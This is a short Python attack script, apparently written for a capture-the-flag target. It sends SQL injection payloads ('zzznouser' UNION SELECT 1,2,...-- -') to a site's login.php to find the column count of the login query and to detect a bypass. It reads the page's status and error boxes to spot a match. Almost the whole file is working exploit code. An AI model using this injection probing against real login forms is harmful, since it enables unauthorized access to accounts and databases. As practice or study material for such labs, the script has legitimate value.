import requests, re, sys

BASE = "http://6033bc60-27f0-4b34-aef3-14d892d241b2.red.cyberkent.uz"

def try_login(username, password="x"):
    r = requests.post(f"{BASE}/login.php", data={"username": username, "password": password}, timeout=10)
    m = re.search(r'<div class="status-box">(.*?)</div>', r.text, re.S)
    status = m.group(1) if m else "(no status box)"
    err = re.search(r'<div class="error-box">(.*?)</div>', r.text, re.S)
    err_text = err.group(1) if err else "(no error box - maybe logged in!)"
    return status, err_text, r

# find column count via UNION
for n in range(1, 8):
    cols = ",".join(str(i) for i in range(1, n+1))
    payload = f"zzznouser' UNION SELECT {cols}-- -"
    status, err, r = try_login(payload)
    print(f"cols={n}: status={status!r} err={err!r}")
    if "xatolik" not in status.lower() and "topilmadi" not in status.lower():
        print("  -> POSSIBLE MATCH at", n, "columns")
